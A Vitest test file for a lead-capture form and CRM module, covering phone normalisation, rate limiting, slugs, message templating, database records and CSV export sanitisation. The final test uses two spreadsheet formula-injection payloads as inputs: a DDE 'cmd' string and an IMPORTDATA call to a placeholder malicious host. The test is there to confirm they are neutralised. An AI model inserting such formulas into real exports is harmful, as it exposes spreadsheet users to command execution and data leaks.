import { describe, it, expect, beforeEach } from 'vitest';
import { normalizeLeadPhone, checkFormRateLimit, renderWelcomeMessage, generateFormSlug } from '../src/lib/forms';
import { sanitizeCsvCell } from '../src/lib/security';
import { db, ensureDbSchema } from '../src/lib/db';

describe('Custom Lead Form Builder & Lead CRM Module', () => {
  beforeEach(async () => {
    await ensureDbSchema();
  });

  describe('Phone Normalization (normalizeLeadPhone)', () => {
    it('normalizes 10-digit mobile numbers by prepending 91', () => {
      expect(normalizeLeadPhone('9876543210')).toBe('919876543210');
      expect(normalizeLeadPhone(' 98765 43210 ')).toBe('919876543210');
      expect(normalizeLeadPhone('98765-43210')).toBe('919876543210');
    });

    it('strips leading + and leading 0 correctly', () => {
      expect(normalizeLeadPhone('+919876543210')).toBe('919876543210');
      expect(normalizeLeadPhone('09876543210')).toBe('919876543210');
      expect(normalizeLeadPhone('+1 415 555 2671')).toBe('14155552671');
    });

    it('returns empty string for empty input', () => {
      expect(normalizeLeadPhone('')).toBe('');
      expect(normalizeLeadPhone('   ')).toBe('');
    });
  });

  describe('Rate Limiter (checkFormRateLimit)', () => {
    it('allows up to 10 submissions within window and blocks 11th', () => {
      const testIp = `192.168.100.${Math.floor(Math.random() * 800) + 100}`;
      for (let i = 0; i < 10; i++) {
        const check = checkFormRateLimit(testIp);
        expect(check.allowed).toBe(true);
      }

      // 11th attempt must be rejected
      const blockedCheck = checkFormRateLimit(testIp);
      expect(blockedCheck.allowed).toBe(false);
      expect(blockedCheck.remaining).toBe(0);
    });
  });

  describe('Slug Generator (generateFormSlug)', () => {
    it('creates URL-safe slugs with random suffix', () => {
      const slug = generateFormSlug('Diwali Mega Offer 2026!');
      expect(slug).toMatch(/^diwali-mega-offer-2026-[a-z0-9]{4}$/);
    });
  });

  describe('Welcome Message Template Interpolation (renderWelcomeMessage)', () => {
    it('replaces {name}, {phone}, {email}, and custom field tokens', () => {
      const template = 'Hello {name}! We received your inquiry for budget {f_budget}. Call us at {phone}.';
      const rendered = renderWelcomeMessage(template, {
        name: 'Paramveer Singh',
        phone: '919876543210',
        email: 'test@example.com',
        customFields: {
          f_budget: '₹50k - ₹2L',
        },
      });

      expect(rendered).toBe('Hello Paramveer Singh! We received your inquiry for budget ₹50k - ₹2L. Call us at 919876543210.');
    });

    it('handles missing or empty custom fields gracefully', () => {
      const template = 'Hi {name}, from {city}!';
      const rendered = renderWelcomeMessage(template, {
        name: 'Aarav',
        phone: '919876543210',
      });
      expect(rendered).toBe('Hi Aarav, from {city}!');
    });
  });

  describe('Database Persistence: Form & Lead', () => {
    it('creates a form, retrieves it by slug, and records a lead', async () => {
      const testSlug = `test-form-${Date.now()}`;
      const form = await db.form.create({
        data: {
          title: 'Diwali Special Offer',
          description: 'Get 30% discount on all packages',
          slug: testSlug,
          fields: JSON.stringify([
            { id: 'f_name', label: 'Full Name', type: 'text', required: true, isSystem: true },
            { id: 'f_phone', label: 'WhatsApp Number', type: 'phone', required: true, isSystem: true },
            { id: 'f_budget', label: 'Estimated Budget', type: 'select', required: false, options: ['Under ₹50k', '₹50k - ₹2L'] },
          ]),
          tag: 'diwali-2026',
          isActive: true,
          autoReplyEnabled: true,
          autoReplyInstance: 'main_account',
          autoReplyTemplate: 'Welcome {name}! Your discount code is DIWALI30.',
        },
      });

      expect(form.id).toBeDefined();
      expect(form.slug).toBe(testSlug);

      // Create a Lead linked to this form
      const lead = await db.lead.create({
        data: {
          formId: form.id,
          name: 'Rohan Sharma',
          phone: '919876543210',
          email: 'rohan@example.com',
          customFields: JSON.stringify({ f_budget: '₹50k - ₹2L' }),
          tag: form.tag,
          status: 'new',
        },
      });

      expect(lead.id).toBeDefined();
      expect(lead.formId).toBe(form.id);
      expect(lead.status).toBe('new');

      // Update lead status (PATCH simulation)
      const updatedLead = await db.lead.update({
        where: { id: lead.id },
        data: { status: 'qualified' },
      });
      expect(updatedLead.status).toBe('qualified');

      // Clean up test records
      await db.lead.delete({ where: { id: lead.id } });
      await db.form.delete({ where: { id: form.id } });
    });
  });

  describe('CSV Sanitization for CRM Lead Export', () => {
    it('neutralizes spreadsheet formula injection on exported lead data', () => {
      expect(sanitizeCsvCell('=cmd|/c calc')).toBe("'=cmd|/c calc");
      expect(sanitizeCsvCell('@IMPORTDATA("http://malicious.com")')).toBe("'@IMPORTDATA(\"http://malicious.com\")");
      expect(sanitizeCsvCell('Paramveer Singh')).toBe('Paramveer Singh');
      expect(sanitizeCsvCell('919876543210')).toBe('919876543210');
    });
  });
});
